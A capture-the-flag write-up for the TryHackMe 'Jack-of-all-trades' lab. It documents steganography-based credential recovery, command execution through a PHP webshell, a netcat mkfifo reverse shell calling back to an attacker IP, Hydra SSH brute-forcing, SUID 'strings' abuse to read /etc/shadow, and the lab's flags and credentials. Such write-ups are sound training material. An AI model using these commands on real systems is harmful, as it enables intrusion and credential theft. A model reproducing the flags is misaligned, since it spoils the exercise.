# 🃏 Jack-of-all-trades

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/jackofalltrades)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com/room/jackofalltrades)
[![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)](https://tryhackme.com/room/jackofalltrades)
[![Type](https://img.shields.io/badge/Type-Linux-blue?style=for-the-badge&logo=linux)](https://tryhackme.com/room/jackofalltrades)

| | |
|---|---|
| **Target** | `10.49.163.39` |
| **OS** | Linux (Debian) |
| **Attack Surface** | HTTP (port 22), SSH (port 80) |
| **Privesc** | SUID `strings` binary (group `dev`) |

Services run on deliberately swapped ports — SSH on 80, HTTP on 22 — forcing immediate attention to banner grabbing. Initial access chains multi-layer encoded HTML comments through steganography to a PHP webshell. Privilege escalation abuses a SUID `strings` binary accessible to the `dev` group, enabling arbitrary file read as root without ever needing a root shell.

---

## 🔍 Enumeration

### Port Scan

```bash
nmap -sT -sC -sV -p- -T4 --open -oA 10.49.163.39_tcp 10.49.163.39
sudo nmap -sU --top-ports 200 -T4 --open -oA 10.49.163.39_udp 10.49.163.39
```

```
PORT   STATE  SERVICE  VERSION
22/tcp open   http     Apache httpd 2.4.10 ((Debian))
|_http-title: Jack-of-all-trades!
80/tcp open   ssh      OpenSSH 6.7p1 Debian 5 (protocol 2.0)
```

The services are **swapped** — HTTP runs on port 22, SSH runs on port 80. All web tools need `:22` appended and all SSH tools need `-p 80`.

### Web Enumeration

```bash
curl http://10.49.163.39:22/
curl http://10.49.163.39:22/recovery.php
```

The homepage contained two hidden HTML comments:

**Comment 1 — Base64:**
```
UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9i...
```

Decoding reveals a steghide passphrase:
```bash
echo "UmVtZW1iZXIg..." | base64 -d
# → ...Also gotta remember your password: u?WtKSraq
```

**Comment 2 — found in `/recovery.php` — Base32 → Hex → ROT13:**
```bash
# Layer 1: Base32
echo "GQ2TOMRXME3TEN3B..." | base32 -d
# → hex string

# Layer 2: Hex to ASCII
echo "45727a727a6f72..." | xxd -r -p
# → ROT13 ciphertext

# Layer 3: ROT13
echo "Erzrzore gung..." | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# → "Remember that the credentials to the recovery login are hidden on the homepage!"
```

### Steganography

Three images were present on the homepage. All three were extracted and tested:

```bash
curl -s http://10.49.163.39:22/assets/header.jpg      -o header.jpg
curl -s http://10.49.163.39:22/assets/stego.jpg        -o stego.jpg
curl -s http://10.49.163.39:22/assets/jackinthebox.jpg -o jackinthebox.jpg

steghide extract -sf stego.jpg        -p 'u?WtKSraq' -f  # ← red herring
steghide extract -sf header.jpg       -p 'u?WtKSraq' -f  # ← hit
steghide extract -sf jackinthebox.jpg -p 'u?WtKSraq' -f  # ← nothing

cat cms.creds
```

```
Username: jackinthebox
Password: TplFxiSHjY
```

`stego.jpg` contained a deliberate troll message — "wrong image!". The credentials were in `header.jpg`.

---

## 💀 Initial Access

### RCE via /recovery.php Webshell

Logging into `/recovery.php` with `jackinthebox:TplFxiSHjY` unlocked a PHP webshell at `/nnxhweOV/index.php`. The webshell validated a session cookie and executed arbitrary commands via `?cmd=`:

```bash
curl "http://10.49.163.39:22/nnxhweOV/index.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

`/bin/nc` was confirmed present on the target. A mkfifo shell was URL-encoded and delivered through the webshell:

```bash
PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote(
  'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | /bin/nc 192.168.240.231 4444 > /tmp/f'
))")
curl -s "http://10.49.163.39:22/nnxhweOV/index.php?cmd=$PAYLOAD"
```

`python3` was not present on the target, so `script` was used to spawn a PTY, followed by the standard stty upgrade on the attacker side:

```bash
# On target — spawn PTY via script
script /dev/null -c bash

# On attacker — background and upgrade
# Ctrl+Z
stty raw -echo; fg
stty rows 92 cols 104; export TERM='xterm'
```

### Lateral Movement — jack

A world-readable password list was found in `/home`:

```bash
cat /home/jacks_password_list   # 24 candidate passwords
```

Hydra brute-forced SSH on port 80:

```bash
hydra -l jack -P jacks_password_list.txt ssh://10.49.163.39:80 -t 4 -V
# [80][ssh] host: 10.49.163.39  login: jack  password: ITMJpGGIqg1jn?>@
```

```bash
ssh jack@10.49.163.39 -p 80
```

Jack's home directory contained `user.jpg` — a 287K image. The user flag was plaintext text overlaid directly on the image (no steganography tool needed — visible on inspection).

---

## 🔁 Privilege Escalation

### SUID strings — Arbitrary File Read as Root

SUID enumeration revealed an unusual binary:

```bash
find / -type f -perm -4000 2>/dev/null | xargs ls -lah
# -rwsr-x--- 1 root dev 27K Feb 25 2015 /usr/bin/strings
```

`strings` is SUID root with group `dev`. The `jack` user is a member of the `dev` group, so the binary runs with root's effective UID when jack executes it — enabling arbitrary read of any file on the system.

```bash
# Dump /etc/shadow
strings /etc/shadow
# root:$6$b3.jqCVW$RhHJyUpN81dfuW6J..8rTYX..7msovXxtbwQX4w8SIqxTuGOGpuKVft.1Cw1yvpGiHh2LULov1EA5H2m33dPk/:...

# Read root flag directly — no shell needed
strings /root/root.txt
```

```
ToDo:
1.Get new penguin skin rug...
...
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```

---

## 🗺️ Attack Chain

```
[Attacker]
    |
    | nmap -sC -sV → swapped ports discovered (HTTP:22, SSH:80)
    v
[Apache :22]
    |
    | curl homepage → Base64 comment → steghide passphrase: u?WtKSraq
    | curl /recovery.php → Base32→Hex→ROT13 → "credentials hidden on homepage"
    | steghide extract -sf header.jpg -p 'u?WtKSraq' → jackinthebox:TplFxiSHjY
    v
[/recovery.php login]
    |
    | POST jackinthebox:TplFxiSHjY → webshell at /nnxhweOV/index.php
    | ?cmd= → RCE as www-data
    | mkfifo + /bin/nc → reverse shell
    | script /dev/null -c bash → PTY (no python3); stty raw -echo → stable shell
    v
[www-data shell]
    |
    | cat /home/jacks_password_list → 24 passwords
    | hydra SSH :80 → jack:ITMJpGGIqg1jn?>@
    v
[SSH as jack :80]
    |
    | user.jpg → flag visible in image (no steg needed)
    | find SUID → /usr/bin/strings (root, group dev — jack is member)
    | strings /root/root.txt → root flag embedded in todo list
    v
[Root file read ✓]
```

---

## 📌 Key Takeaways

1. **Always banner-grab every port** — services on non-standard ports are a common CTF trick and a real-world misconfiguration. `nmap -sC -sV` on all ports would have caught the swap immediately.
2. **Multi-layer encoding in page source is always worth decoding fully** — Base32 → Hex → ROT13 looks intimidating but each layer is trivial once identified. Piping tools together (`base32 -d | xxd -r -p | tr`) makes it fast.
3. **Check all image assets for steganography** — the box had three images; two were distractions. When a hint says "credentials are on the homepage," every image is a candidate.
4. **SUID binaries that aren't on the standard list are high-value** — `strings` with SUID root is not normal. GTFOBins covers it under file read. The dev group membership was the key link — check `id` and cross-reference group-executable SUID binaries.
5. **A full root shell isn't always required** — SUID file read was sufficient to capture the flag without privilege escalation to an interactive root shell.

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning | [T1595](https://attack.mitre.org/techniques/T1595) |
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Credential Access | Brute Force: Password Spraying | [T1110.003](https://attack.mitre.org/techniques/T1110/003) |
| Credential Access | OS Credential Dumping | [T1003](https://attack.mitre.org/techniques/T1003) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004) |
| Lateral Movement | Remote Services: SSH | [T1021.004](https://attack.mitre.org/techniques/T1021/004) |
| Privilege Escalation | Abuse Elevation Control Mechanism: Setuid and Setgid | [T1548.001](https://attack.mitre.org/techniques/T1548/001) |
| Discovery | File and Directory Discovery | [T1083](https://attack.mitre.org/techniques/T1083) |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port and service enumeration |
| `curl` | Homepage and recovery page enumeration |
| `steghide` | Extracting hidden data from JPEG images |
| `hydra` | SSH brute-force against jack's password list |
| `netcat` | Reverse shell listener |
| `hashcat` / `john` | sha512crypt hash cracking (root hash) |

---

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}`

</details>

<details>
<summary><code>root.txt</code></summary>

`securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}`

</details>
